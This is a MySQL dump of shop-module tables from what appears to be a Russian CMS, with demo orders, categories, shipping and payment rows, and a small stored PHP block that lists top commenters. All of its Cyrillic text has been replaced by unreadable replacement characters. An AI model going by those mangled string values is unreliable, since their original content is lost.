-- ���� ������ ������� `cp_modul_shop_artikel_downloads`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_artikel_kommentare`
-- 

CREATE TABLE `cp_modul_shop_artikel_kommentare` (
  `Id` int(8) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Benutzer` int(10) unsigned NOT NULL default '0',
  `Datum` int(14) unsigned NOT NULL default '0',
  `Titel` varchar(255) NOT NULL,
  `comment_text` text NOT NULL,
  `Wertung` smallint(1) unsigned NOT NULL default '0',
  `Publik` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_artikel_kommentare`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_bestellungen`
-- 

CREATE TABLE `cp_modul_shop_bestellungen` (
  `Id` int(14) unsigned NOT NULL auto_increment,
  `Benutzer` varchar(255) NOT NULL,
  `TransId` varchar(100) NOT NULL,
  `Datum` int(14) unsigned NOT NULL default '0',
  `Gesamt` decimal(7,2) NOT NULL default '0.00',
  `USt` decimal(7,2) NOT NULL default '0.00',
  `Artikel` text NOT NULL,
  `Artikel_Vars` text NOT NULL,
  `RechnungText` text NOT NULL,
  `RechnungHtml` text NOT NULL,
  `NachrichtBenutzer` text NOT NULL,
  `NachrichtAdmin` text NOT NULL,
  `Ip` varchar(200) NOT NULL,
  `ZahlungsId` mediumint(5) unsigned NOT NULL default '0',
  `VersandId` mediumint(5) unsigned NOT NULL default '0',
  `KamVon` tinytext NOT NULL,
  `Gutscheincode` int(10) default NULL,
  `Bestell_Email` varchar(255) NOT NULL,
  `Liefer_Firma` varchar(100) NOT NULL,
  `Liefer_Abteilung` varchar(100) NOT NULL,
  `Liefer_Vorname` varchar(100) NOT NULL,
  `Liefer_Nachname` varchar(100) NOT NULL,
  `Liefer_Strasse` varchar(100) NOT NULL,
  `Liefer_Hnr` varchar(10) NOT NULL,
  `Liefer_PLZ` varchar(15) NOT NULL,
  `Liefer_Ort` varchar(100) NOT NULL,
  `Liefer_Land` char(2) NOT NULL,
  `Rech_Firma` varchar(100) NOT NULL,
  `Rech_Abteilung` varchar(100) NOT NULL,
  `Rech_Vorname` varchar(100) NOT NULL,
  `Rech_Nachname` varchar(100) NOT NULL,
  `Rech_Strasse` varchar(100) NOT NULL,
  `Rech_Hnr` varchar(10) NOT NULL,
  `Rech_PLZ` varchar(15) NOT NULL,
  `Rech_Ort` varchar(100) NOT NULL,
  `Rech_Land` char(2) NOT NULL,
  `Status` enum('wait','progress','ok','ok_send','failed') NOT NULL default 'wait',
  `DatumBezahlt` int(10) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_shop_bestellungen`
-- 

INSERT INTO `cp_modul_shop_bestellungen` VALUES (1, '1', '56GUXDT270410', 1272334373, 1.00, 0.00, 'a:1:{i:17;i:1;}', '', '=================================================\r\n������������� ������\r\n=================================================\r\n\r\n��� ������ �� �������� ������������� ������� ������.�������� �������� ���� �������� �� �������� ����������� ������. ��� ��������� ������ �� �������� ���� ������� ����� ����� ������������ � ���������� ����������. \r\n=================================================\r\n\r\n����� �������� ������\r\n=================================================\r\n�\\''��������\r\n123-45-67\r\n�\\''�������� �\\''��������\r\n\r\n�\\''�������� 1\r\n1234567 �\\''��������\r\nRU\r\n\r\n\r\n����� �������� �����\r\n=================================================\r\n��������� � ������� �������� ������\r\n#################################################\r\n����� 1by1 (���. �: sdfsdw332) �� ��������� ���� �� ������\r\n����������: 1\r\n����: 1 �\r\n�����: 1 �\r\n#################################################\r\n\r\n����� ������: 1\r\n���� ������: 27.04.2010, 06:12:53\r\n��� ����������: 56GUXDT270410\r\n\r\n��� ��������: �������� �� ������\r\n��� ������: ��������� �������\r\n\r\n��������� �������: 1 �\r\n�������� � ��������: 0 �\r\n\r\n����� ������: 0 �\r\n�������� �����: 1 �\r\n=================================================\r\n\r\n=================================================\r\n\r\n\r\n������ ���������� � ������\r\n��������� �������\r\n�������� ��� ��������� (�� ������) - ������ �������������� ��������� �������� ������� � ������ ��������. ����� ������������ ������ ��� �������� �������� � ���� �� ����������� �������� � ��� ��� ������� ��������� ������ � ��� �����. ���� ��, ���������� �����, � ���������� ������������� �� ��� ���������, �� ��� ���������� �������� ��������� �������� + 50 ��� �� ������ ������������ �������. � ������ ������������� �������� ��� ������ ������� ��������� � ����� ����������.\r\n\r\n\r\n� ��� ���� �������? ���������� � ����� ����������.\r\n', '<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1251" /><title></title></head>\r\n<style type="text/css">\r\nhtml, body, td, div, th {\r\n	font:11px Verdana,Arial,Helvetica,sans-serif;\r\n}\r\n.articlesborder {\r\n	background-color:#ccc;\r\n}\r\n.articlesrow {\r\n	background-color:#fff;\r\n}\r\n.articlesheader {\r\n	background-color:#eee;\r\n}\r\n.overall {\r\n	background-color:#eee;\r\n	font-size:14px;\r\n	border-top:1px solid #ccc;\r\n}\r\n</style>\r\n<body><div id="shopcontent"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0"><tr><td></td><td align="right"></td></tr></table><hr noshade="noshade" size="1"><h3><strong>������������� ������</strong></h3>��� ������ �� �������� ������������� ������� ������.<br />�������� �������� ���� �������� �� �������� ����������� ������. ��� ��������� ������ �� �������� ���� ������� ����� ����� ������������ � ���������� ����������. <hr noshade="noshade" size="1"><table width="100%"><tr><td valign="top"><h3><strong>����� �������� ������</strong></h3><strong>�\\''��������</strong><br />123-45-67<br />�\\''�������� �\\''��������<br /><br />�\\''�������� 1<br />1234567 �\\''��������<br />RU<br /></td><td valign="top"><h3><strong>����� �������� �����</strong></h3>��������� � ������� �������� ������</td></tr><tr><td valign="top">&nbsp;<br /><br /></td><td valign="top">&nbsp;</td></tr></table><table width="100%" border="0" cellpadding="3" cellspacing="1" class="articlesborder"><tr><td valign="top" class="articlesheader"><strong>�������</strong></td><td valign="top" class="articlesheader"><strong>���. �</strong></td><td valign="top" align="right" class="articlesheader"><strong>����������</strong></td><td align="right" valign="top" class="articlesheader"><strong>����</strong></td><td align="right" valign="top" class="articlesheader"><strong>�����</strong></td></tr><tr><td valign="top" class="articlesrow"> <strong>����� 1by1</strong><!-- DELIVERY TIME --><div class="mod_shop_timetillshipping">�� ��������� ���� �� ������</div><!-- /DELIVERY TIME --><!-- PRODUCT VARIATIONS --><!-- /PRODUCT VARIATIONS --></td><td valign="top" class="articlesrow">sdfsdw332</td><td align="center" valign="top" class="articlesrow">1</td><td align="right" valign="top" class="articlesrow" nowrap="nowrap">1 �</td><td align="right" valign="top" class="articlesrow" nowrap="nowrap">1 �</td></tr></table><br /><br /><table width="100%" border="0" cellspacing="0" cellpadding="1"><tr><td>����� ������:</td><td class="mod_shop_summlist">1</td></tr><tr><td>���� ������:</td><td class="mod_shop_summlist">27.04.2010, 06:12:53</td></tr><tr><td class="mod_shop_summlist">��� ����������:</td><td class="mod_shop_summlist">56GUXDT270410</td></tr><tr><td class="mod_shop_summlist">&nbsp;</td><td class="mod_shop_summlist">&nbsp;</td></tr><tr><td width="200">��� ��������:</td><td class="mod_shop_summlist">�������� �� ������</td></tr><tr><td width="200">��� ������:</td><td class="mod_shop_summlist">��������� �������</td></tr><tr><td width="200" class="mod_shop_summlist">&nbsp;</td><td align="right" class="mod_shop_summlist">&nbsp;</td></tr><tr><td width="200"><strong>��������� �������:</strong></td><td class="mod_shop_summlist"><strong>1 �</strong></td></tr><tr><td width="200">�������� � ��������:</td><td> 0 �</td></tr><tr><td width="200" class="overall"><strong>�������� �����:</strong></td><td class="overall"><strong>1 �</strong><br /><span class="mod_shop_ust">1 �</span></td></tr><tr><td width="200">&nbsp;</td><td>&nbsp;</td></tr></table><hr noshade="noshade" size="1"><h3>������ ���������� � ������</h3><strong>��������� �������</strong><br /><em>�������� ��� ��������� (�� ������) - ������ �������������� ��������� �������� ������� � ������ ��������. ����� ������������ ������ ��� �������� �������� � ���� �� ����������� �������� � ��� ��� ������� ��������� ������ � ��� �����. ���� ��, ���������� �����, � ���������� ������������� �� ��� ���������, �� ��� ���������� �������� ��������� �������� + 50 ��� �� ������ ������������ �������. � ������ ������������� �������� ��� ������ ������� ��������� � ����� ����������.</em><hr noshade="noshade" size="1"><strong>� ��� ���� �������? ���������� � ����� ����������.</strong><br /></td></tr></table></div></body></html>', '', '', '127.0.0.1', 1, 1, '', 0, 'admin@ave.ru', '�''��������', '', '�''��������', '�''��������', '�''��������', '1', '1234567', '�''��������', 'RU', '�''��������', '', '�''��������', '�''��������', '�''��������', '1', '1234567', '�''��������', '', 'wait', 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_downloads`
-- 

CREATE TABLE `cp_modul_shop_downloads` (
  `Id` int(11) unsigned NOT NULL auto_increment,
  `Benutzer` int(11) NOT NULL default '0',
  `PName` varchar(255) NOT NULL,
  `ArtikelId` varchar(50) NOT NULL,
  `DownloadBis` int(11) NOT NULL default '0',
  `Lizenz` varchar(20) NOT NULL,
  `Downloads` int(11) NOT NULL default '0',
  `UrlLizenz` varchar(255) NOT NULL,
  `KommentarBenutzer` text NOT NULL,
  `KommentarAdmin` text NOT NULL,
  `Gesperrt` tinyint(1) NOT NULL default '0',
  `GesperrtGrund` text NOT NULL,
  `Position` smallint(2) NOT NULL default '1',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_downloads`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_einheiten`
-- 

CREATE TABLE `cp_modul_shop_einheiten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` char(100) NOT NULL,
  `NameEinzahl` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_einheiten`
-- 

INSERT INTO `cp_modul_shop_einheiten` VALUES (1, '�����', '�����');
INSERT INTO `cp_modul_shop_einheiten` VALUES (2, '�������', '�������');
INSERT INTO `cp_modul_shop_einheiten` VALUES (3, '����', '����');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_gutscheine`
-- 

CREATE TABLE `cp_modul_shop_gutscheine` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Code` varchar(100) NOT NULL,
  `Prozent` decimal(4,2) NOT NULL default '10.00',
  `Mehrfach` tinyint(1) unsigned NOT NULL default '1',
  `Benutzer` text NOT NULL,
  `Eingeloest` int(14) unsigned NOT NULL default '0',
  `BestellId` text NOT NULL,
  `GueltigVon` int(14) unsigned NOT NULL default '0',
  `GueltigBis` int(14) unsigned NOT NULL default '0',
  `AlleBenutzer` tinyint(1) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Code` (`Code`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_gutscheine`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_hersteller`
-- 

CREATE TABLE `cp_modul_shop_hersteller` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `Name` char(255) NOT NULL,
  `Link` char(255) NOT NULL,
  `Logo` char(255) NOT NULL,
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=4 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_hersteller`
-- 

INSERT INTO `cp_modul_shop_hersteller` VALUES (1, 'HP', 'www.hp.ru', 'uploads/manufacturer/icon_hp.gif');
INSERT INTO `cp_modul_shop_hersteller` VALUES (2, 'Asus', 'www.asus.com', 'uploads/manufacturer/icon_asus.gif');
INSERT INTO `cp_modul_shop_hersteller` VALUES (3, 'Acer', 'www.acer.com', 'uploads/manufacturer/icon_acer.gif');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_kategorie`
-- 

CREATE TABLE `cp_modul_shop_kategorie` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `parent_id` mediumint(5) unsigned NOT NULL default '0',
  `KatName` varchar(100) NOT NULL,
  `KatBeschreibung` text NOT NULL,
  `position` smallint(3) unsigned NOT NULL default '1',
  `Bild` varchar(255) NOT NULL,
  `bid` int(5) unsigned NOT NULL default '0',
  `cbid` int(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `KatName` (`KatName`)
) ENGINE=MyISAM AUTO_INCREMENT=29 DEFAULT CHARSET=cp1251 PACK_KEYS=0;

-- 
-- ���� ������ ������� `cp_modul_shop_kategorie`
-- 

INSERT INTO `cp_modul_shop_kategorie` VALUES (1, 0, '��������', '���������� ���������� (�������) &mdash; ���������� ��� ����������� (������) ������ ��� ����������� ���������� �� ��������, � ��������, �� ������. �. �. � ����������� �� ������������ �������� ������ ������ ��������, ����������, ��������, �� ���� ������������� �������� ����������� � ����������� ����������.<br />', 2, 'icon_printer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (2, 0, '��������', '������� (�� ����. notebook - �������� ������, �������) - ���������� ����������� ���������. �������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;<br />', 1, 'icon_note.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (3, 0, '����������', '<br />', 3, 'icon_camer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (4, 0, '���������', '<br />', 4, 'icon_xp.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (5, 0, '�����', '<br />', 5, 'icon_book.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (6, 2, '����� 10''�12''', '<br />', 1, 'icon_10_12.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (10, 4, '��� Windows', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (11, 10, '�����������', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (12, 11, '�����', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (13, 12, '������', '<br />', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (22, 2, '�������� HP', 'HP (Hewlett-Packard) ��� ������� ��������� �������� ���������� ��� ������������� ���������� � �������� �������������. �������� HP ������������� ������� � ������� ��-��������������, ������������ �������������� ������ � ��������� �������, ������ �� ��������&nbsp;', 5, 'icon_hp.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (19, 2, '����� 13''�14''', '�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;�������� ������������ &nbsp;', 2, 'icon_13_14.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (20, 2, '����� 15''�16.4''', '&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������.&nbsp;', 3, 'icon_15_16.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (21, 2, '����� 17'' � �����', '�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;�������� ���������. �������� � ������� - ������ - ������� - ���������. &nbsp;', 4, 'icon_17.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (23, 2, '�������� Asus', '&nbsp;�������� Asus ����������� ������ ������ ���������� ���������� �� ������������� � ��������� ��������� �����������. ��� �������� ��� �������� ����� �������������, ���������� ��������� ������������������� � ����� �����������. ASUS �������� ���������� �������', 8, 'icon_asus.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (24, 2, '�������� Acer', '���������� ������� �������� Acer ����� �������� ���������� ������� ������. ��� &quot;�������&quot; �������� ����������� ������������� � ��������� ������������ ������� ���� ��������� �� ��������� ������, �������, ��������, �������, �������, �����. ������� ���������&nbsp;', 9, 'icon_acer.gif', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (25, 1, '��������', '�������� ���������� ���������� (�������� �������) &mdash; ������������ ���������� ������������ �������, � ������� ��� ������ ������������ �������� �������������� ������ �� ����������� �����.&nbsp;', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (26, 1, '����������������', '������� �� ������� �������� &mdash; �������� �������, � ������� ������������ �. �. ���������� ����� ���, ����������� �� ������� ����� ����������� ��������� ��������� � �������� ���������.&nbsp;', 2, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (27, 5, '��������', '������� - ������� �������:\n<ul>\n    <li>���������� ��������������� ��������� ������� ����������, �� ������� ��� �����;&nbsp;</li>\n    <li>��������������� ������� ���������; �&nbsp;</li>\n    <li>���������� ������������ � �������� ��������</li>\n</ul>', 1, '', 0, 0);
INSERT INTO `cp_modul_shop_kategorie` VALUES (28, 3, '�������� ������������', '����������� ����������� - �����������, � ������� ����������� ����������� �������������� ����������� ������������ �����������, ������� ������� ��:\r\n<ul>\r\n    <li>����������, ������������� ���� � ������������� ������; �</li>\r\n    <li>�������� � ��������� ������, ����������� ������������� ���������� ������ ������ �����.</li>\r\n</ul>\r\n����� �������-����������� �������������� ������ ���������� � ������������ ���������� ������������. <br />\r\n<br />\r\n�����-����� ����������� ����������� ����� ���� ����������, ������� - ��� ����������.', 1, '', 0, 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_kundenrabatte`
-- 

CREATE TABLE `cp_modul_shop_kundenrabatte` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `GruppenId` smallint(3) unsigned NOT NULL default '0',
  `Wert` decimal(7,2) unsigned NOT NULL default '0.00',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `GruppenId` (`GruppenId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_kundenrabatte`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_merkliste`
-- 

CREATE TABLE `cp_modul_shop_merkliste` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Benutzer` int(10) unsigned NOT NULL default '0',
  `Ip` varchar(200) NOT NULL,
  `Inhalt` text NOT NULL,
  `Inhalt_Vars` text NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_merkliste`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_staffelpreise`
-- 

CREATE TABLE `cp_modul_shop_staffelpreise` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `ArtId` int(10) unsigned NOT NULL default '0',
  `StkVon` mediumint(5) NOT NULL default '2',
  `StkBis` mediumint(5) NOT NULL default '5',
  `Preis` decimal(10,2) NOT NULL default '0.00',
  PRIMARY KEY  (`Id`),
  KEY `ArtId` (`ArtId`),
  KEY `Preis` (`Preis`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_staffelpreise`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_ust`
-- 

CREATE TABLE `cp_modul_shop_ust` (
  `Id` smallint(3) unsigned NOT NULL auto_increment,
  `Name` char(100) NOT NULL,
  `Wert` decimal(4,2) NOT NULL default '16.00',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_ust`
-- 

INSERT INTO `cp_modul_shop_ust` VALUES (1, '���', 18.00);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_varianten`
-- 

CREATE TABLE `cp_modul_shop_varianten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `KatId` int(10) unsigned NOT NULL default '0',
  `ArtId` int(10) unsigned NOT NULL default '0',
  `Name` char(255) NOT NULL,
  `Wert` decimal(7,2) NOT NULL default '0.00',
  `Operant` enum('+','-') NOT NULL default '+',
  `Position` smallint(3) unsigned NOT NULL default '1',
  `Vorselektiert` enum('0','1') NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  KEY `KatId` (`KatId`),
  KEY `ArtId` (`ArtId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_varianten`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_varianten_kategorien`
-- 

CREATE TABLE `cp_modul_shop_varianten_kategorien` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `KatId` mediumint(5) unsigned NOT NULL default '0',
  `Name` varchar(200) NOT NULL,
  `description` text NOT NULL,
  `status` tinyint(1) unsigned NOT NULL default '1',
  PRIMARY KEY  (`Id`),
  KEY `KatId` (`KatId`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_varianten_kategorien`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_versandarten`
-- 

CREATE TABLE `cp_modul_shop_versandarten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `Name` varchar(200) NOT NULL default '',
  `description` text NOT NULL,
  `Icon` varchar(255) NOT NULL default '',
  `LaenderVersand` tinytext NOT NULL,
  `Pauschalkosten` decimal(5,2) NOT NULL default '0.00',
  `KeineKosten` tinyint(1) unsigned NOT NULL default '0',
  `Aktiv` tinyint(1) unsigned NOT NULL default '0',
  `NurBeiGewichtNull` tinyint(1) unsigned NOT NULL default '0',
  `ErlaubteGruppen` tinytext NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_versandarten`
-- 

INSERT INTO `cp_modul_shop_versandarten` VALUES (1, '�������� �� ������', '<br />', '', 'BY,RU,UA', 300.00, 1, 1, 0, '1,2,4,3');
INSERT INTO `cp_modul_shop_versandarten` VALUES (2, '�������� � �����������', '��������� �������� �� ������� ���� - 200 ������ ����: �� 0 �� 5 �� - 50 ������, �� 5 �� 10 �� - 100 ������, �� 10 �� 15 �� - 150 ������.', '', 'BY,RU,UA', 200.00, 1, 1, 0, '1,2,4,3');
INSERT INTO `cp_modul_shop_versandarten` VALUES (3, '����� ������', '<br />', '', 'BY,RU,UA', 500.00, 1, 1, 0, '1,2,4,3');
INSERT INTO `cp_modul_shop_versandarten` VALUES (4, '���������', '', '', '', 0.00, 0, 0, 0, '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_versandkosten`
-- 

CREATE TABLE `cp_modul_shop_versandkosten` (
  `Id` int(10) unsigned NOT NULL auto_increment,
  `VersandId` int(10) unsigned NOT NULL default '0',
  `country` char(2) NOT NULL default 'RU',
  `KVon` decimal(8,3) NOT NULL default '0.001',
  `KBis` decimal(8,3) NOT NULL default '10.000',
  `Betrag` decimal(7,2) NOT NULL default '0.00',
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_versandkosten`
-- 


-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_versandzeit`
-- 

CREATE TABLE `cp_modul_shop_versandzeit` (
  `Id` smallint(2) unsigned NOT NULL auto_increment,
  `Name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `Icon` varchar(255) NOT NULL,
  PRIMARY KEY  (`Id`)
) ENGINE=MyISAM AUTO_INCREMENT=5 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_versandzeit`
-- 

INSERT INTO `cp_modul_shop_versandzeit` VALUES (1, '� ������� 2-3 ����', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (2, '�� ��������� ���� �� ������', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (3, '2-3 ������ ��� �����', '', '');
INSERT INTO `cp_modul_shop_versandzeit` VALUES (4, '�������� ��� ���������� ����� ����� ������', '', '');

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_shop_zahlungsmethoden`
-- 

CREATE TABLE `cp_modul_shop_zahlungsmethoden` (
  `Id` mediumint(5) unsigned NOT NULL auto_increment,
  `Name` varchar(255) NOT NULL,
  `description` text NOT NULL,
  `ErlaubteVersandLaender` tinytext NOT NULL,
  `ErlaubteVersandarten` tinytext NOT NULL,
  `ErlaubteGruppen` tinytext NOT NULL,
  `Aktiv` tinyint(1) unsigned NOT NULL default '0',
  `Kosten` decimal(7,2) NOT NULL default '0.00',
  `KostenOperant` enum('Wert','%') NOT NULL default 'Wert',
  `InstId` varchar(100) NOT NULL,
  `Modus` int(10) unsigned default NULL,
  `ZahlungsBetreff` varchar(255) NOT NULL,
  `TestModus` varchar(10) NOT NULL,
  `Extern` tinyint(1) unsigned default NULL,
  `Gateway` varchar(100) default NULL,
  `Position` mediumint(5) unsigned NOT NULL default '0',
  PRIMARY KEY  (`Id`),
  UNIQUE KEY `Name` (`Name`)
) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_shop_zahlungsmethoden`
-- 

INSERT INTO `cp_modul_shop_zahlungsmethoden` VALUES (1, '��������� �������', '�������� ��� ��������� (�� ������) - ������ �������������� ��������� �������� ������� � ������ ��������. ����� ������������ ������ ��� �������� �������� � ���� �� ����������� �������� � ��� ��� ������� ��������� ������ � ��� �����. ���� ��, ���������� �����, � ���������� ������������� �� ��� ���������, �� ��� ���������� �������� ��������� �������� + 50 ��� �� ������ ������������ �������. � ������ ������������� �������� ��� ������ ������� ��������� � ����� ����������.<br />', 'BY,RU,UA', '2,1', '1,2,4,3', 1, 0.00, 'Wert', '', NULL, '', '', 0, '', 0);
INSERT INTO `cp_modul_shop_zahlungsmethoden` VALUES (2, '����������� ������', '���������� ������ - ����� ���������� ������ �� ����� �� ������ ����������� ��������� ��� ������ ����� ����. ������� ������� - ����� ������������� �������� ����� ��������� ��� �� �������� ����� �� ������ e-mail. �� ���������� � �������� ��� ����� � ������� 3-5 ������� ���� � ������� ����������� ����� �� ��� ��������� ����. ���� ����������� ������ �� �������� �� ������, ��� �������� ����������� �������� � ���� ��� ���������� ��������� ��������. <br />', 'BY,RU,UA', '3', '1,2,4,3', 1, 13.00, '%', '', NULL, '', '', 0, '', 0);

-- --------------------------------------------------------

-- 
-- ��������� ������� `cp_modul_sysblock`
-- 

CREATE TABLE `cp_modul_sysblock` (
  `id` mediumint(5) unsigned NOT NULL auto_increment,
  `sysblock_name` varchar(255) NOT NULL,
  `sysblock_text` longtext NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=22 DEFAULT CHARSET=cp1251;

-- 
-- ���� ������ ������� `cp_modul_sysblock`
-- 

INSERT INTO `cp_modul_sysblock` VALUES (1, '�������� "������������"', '<?php\r\n$limit = 5;\r\n$i = 0;\r\n$sql = $AVE_DB->Query("\r\n	SELECT \r\n		Author, \r\n		COUNT(Author_Id) AS comments\r\n	FROM " . PREFIX . "_modul_comment_info\r\n	WHERE Author_Id != ''0''\r\n	GROUP BY Author_Id\r\n	ORDER BY comments DESC\r\n	LIMIT " . $limit\r\n);\r\nwhile ($row = $sql->fetchrow())\r\n{\r\n	echo ''<strong>'', ++$i, '' �����:</strong> '', htmlspecialchars($row->Author), \r\n		''<small style="text-align:right;">(������������: '', \r\n		$row->comments, '')</small>'';\r\n}\r\n?>');
